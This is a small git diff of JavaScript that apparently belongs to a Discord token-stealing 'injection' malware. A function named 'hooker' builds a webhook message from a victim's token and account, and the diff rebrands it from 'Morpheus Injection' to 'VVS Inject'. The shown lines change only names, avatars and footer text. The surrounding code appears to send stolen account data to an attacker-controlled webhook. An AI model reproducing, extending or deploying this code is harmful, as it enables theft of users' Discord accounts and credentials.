@@ -84,14 +84,14 @@ const request = async (method, url, headers, data) => {
 };
 
 const hooker = async (content, token, account) => {
-  content["username"] = "Morpheus Injection";
-  content["avatar_url"] = "https://cdn.discordapp.com/avatars/1258711833800609837/72564c98be57b45f733245a8e7907a2c.webp?size=1024&format=webp";
+  content["username"] = "VVS Inject";
+  content["avatar_url"] = "https://avatars.githubusercontent.com/u/198399128?v=4";
 
   content["embeds"][0]["thumbnail"] = {
     url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`,
   };
   content["embeds"][0]["footer"] = {
-    text: "Morpheus - by Nyxoy",
+    text: "VVS - By rlyb",
     icon_url: "https://cdn.discordapp.com/avatars/1258711833800609837/72564c98be57b45f733245a8e7907a2c.webp?size=1024&format=webp",
   };
   content["embeds"][0]["title"] = content["name"];
